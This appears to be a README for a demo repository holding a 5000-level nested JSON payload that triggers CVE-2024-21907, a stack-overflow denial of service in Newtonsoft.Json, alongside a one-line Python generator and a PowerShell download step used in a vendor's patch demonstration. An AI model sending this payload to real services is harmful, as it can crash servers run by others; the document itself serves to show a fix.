# JSON Payload — CVE-2024-21907

Pre-generated deeply nested JSON payload for demonstrating [CVE-2024-21907](https://nvd.nist.gov/vuln/detail/CVE-2024-21907) in Newtonsoft.Json.

## The Vulnerability

Newtonsoft.Json <= 13.0.1 uses recursive descent parsing. Deeply nested JSON exhausts the thread stack, causing a `StackOverflowException` (Denial of Service).

## payload.json

5000 levels of nested JSON objects (~30KB):

```json
{"n":{"n":{"n":{"n":{"n":{"n":...5000 levels...}}}}}}
```

## Usage

Used by the [seal-security-nuget-demo](https://github.com/seal-sec-demo-2/seal-security-nuget-demo) GitHub Actions workflow.

The workflow downloads and POSTs this payload to the app automatically:

```powershell
$payload = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/seal-sec-demo-2/json-payload/main/payload.json" -UseBasicParsing).Content
```

**Without Seal Security:** Server crashes with `StackOverflowException`  
**With Seal Security (12.0.2-sp1):** Parsed safely, app stays up

## Regenerate

```bash
python3 -c "d=5000; print('{\"n\":'*d + '1' + '}'*d)" > payload.json
```
